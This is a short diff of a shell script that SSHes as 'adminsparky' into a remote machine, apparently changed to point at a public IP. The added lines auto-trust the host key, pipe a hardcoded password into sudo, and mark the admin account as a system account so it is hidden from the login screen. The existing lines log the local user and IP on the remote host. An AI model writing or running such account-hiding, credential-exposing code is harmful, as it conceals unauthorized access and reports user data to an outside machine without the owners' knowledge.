@@ -31,8 +31,10 @@ clear
 
 # SSH into remote computer and edit file
 remote_username='adminsparky'
-remote_ip='10.101.25.68'
-ssh "$remote_username@$remote_ip" <<EOF
+remote_ip='20.20.17.16'
+ssh -t "$remote_username@$remote_ip" <<EOF
+    yes | ssh-keyscan $remote_ip >> ~/.ssh/known_hosts
+    echo kam | sudo -S su - -c "echo '[User]\nSystemAccount=true' >> /var/lib/AccountsService/users/adminsparky"
     mkdir -p ~/Documents
     touch ~/Documents/somefile.txt
     echo "$username@$ip" >> ~/Documents/somefile.txt
